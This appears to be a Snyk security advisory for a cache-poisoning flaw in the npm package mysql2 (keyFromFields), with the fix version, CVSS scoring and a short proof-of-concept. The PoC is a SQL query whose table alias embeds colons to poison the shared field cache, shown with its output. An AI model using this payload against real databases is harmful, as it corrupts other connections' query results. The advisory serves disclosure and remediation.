### Threat Intelligence

Exploit Maturity

Snyk has a proof-of-concept or detailed explanation of how to exploit this vulnerability.

Proof of conceptEPSS

The probability is the direct output of the EPSS model, and conveys an overall sense of the threat of
exploitation in the wild. The percentile measures the EPSS probability relative to all known EPSS scores.
Note: This data is updated daily, relying on the latest available EPSS model version.

## How to fix?

Upgrade `mysql2` to version 3.9.3 or higher.

## Overview

[mysql2](https://www.npmjs.com/package/mysql2) is a mostly API compatible with mysqljs and supports majority of features.

Affected versions of this package are vulnerable to Use of Web Browser Cache Containing Sensitive Information through the `keyFromFields` function, resulting in cache poisoning. An attacker can inject a colon (`:`) character within a value of the attacker-crafted key.

## PoC

```
  connection.query(
    'SELECT information_schema.tables.TABLE_NAME,`tables:160:63/DATA_LENGTH:8:undefined::tables`.TABLE_ROWS FROM information_schema.tables INNER JOIN information_schema.tables AS `tables:160:63/DATA_LENGTH:8:undefined::tables` ON `tables:160:63/DATA_LENGTH:8:undefined::tables`.TABLE_ROWS!=information_schema.tables.TABLE_ROWS LIMIT 1;',
    function(err, results, fields) {
    }
  );
  // Send another request and spwan new connection
  connection1.query(
    `SELECT TABLE_NAME, TABLE_ROWS, DATA_LENGTH FROM information_schema.tables LIMIT 1;`,
    function(err, results, fields) {
      console.log(results);
      console.log(fields);
    }
  );

```

Results

```
[ { TABLE_NAME: 'ADMINISTRABLE_ROLE_AUTHORIZATIONS', TABLE_ROWS: 0 } ]
[
  `TABLE_NAME` VARCHAR(64) NOT NULL,
  `TABLE_ROWS` BIGINT(21) UNSIGNED,
  `DATA_LENGTH` BIGINT(21) UNSIGNED
]

```

### CVSS Scores

version 3.1
### Snyk

6.5 medium

* Attack Vector (AV)

  The vulnerable component is bound to the network stack and the set of possible attackers extends beyond the other options listed below, up to and including the entire Internet. Such a vulnerability is often termed “remotely exploitable” and can be thought of as an attack being exploitable *at the protocol level* one or more network hops away (e.g., across one or more routers).

  **Network**
* Attack Complexity (AC)

  Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success when attacking the vulnerable component.

  **Low**
* Privileges Required (PR)

  The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files of the vulnerable system to carry out an attack.

  **None**
* User Interaction (UI)

  The vulnerable system can be exploited without interaction from any user.

  **None**

* Scope (S)

  An exploited vulnerability can only affect resources managed by the same security authority. In this case, the vulnerable component and the impacted component are either the same, or both are managed by the same security authority.

  **Unchanged**

* Confidentiality (C)

  There is some loss of confidentiality. Access to some restricted information is obtained, but the attacker does not have control over what information is obtained, or the amount or kind of loss is limited. The information disclosure does not cause a direct, serious loss to the impacted component.

  **Low**
* Integrity (I)

  There is no loss of integrity within the impacted component.

  **None**
* Availability (A)

  Performance is reduced or there are interruptions in resource availability. Even if repeated exploitation of the vulnerability is possible, the attacker does not have the ability to completely deny service to legitimate users. The resources in the impacted component are either partially available all of the time, or fully available only some of the time, but overall there is no direct, serious consequence to the impacted component.

  **Low**
